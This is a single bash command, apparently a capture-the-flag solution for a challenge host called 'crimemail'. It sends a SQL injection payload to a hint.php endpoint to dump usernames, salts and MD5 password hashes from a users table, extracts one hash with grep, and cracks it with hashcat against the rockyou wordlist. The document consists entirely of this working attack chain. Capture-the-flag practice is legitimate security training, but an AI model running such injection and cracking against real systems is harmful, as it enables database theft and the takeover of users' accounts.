```bash
curl -s --data-urlencode "username=username=data' union select group_concat(concat(username,0x20,pass_salt,0x20,pass_md5)) from users-- " -X POST https://crimemail.ctf.insecurity-insa.fr/hint.php | grep -Eo "c\.hackle.*d" > hash; ./hashcat -a 0 -m 10 `awk '{print $3 ":" $2}' hash` rockyou.txt
```
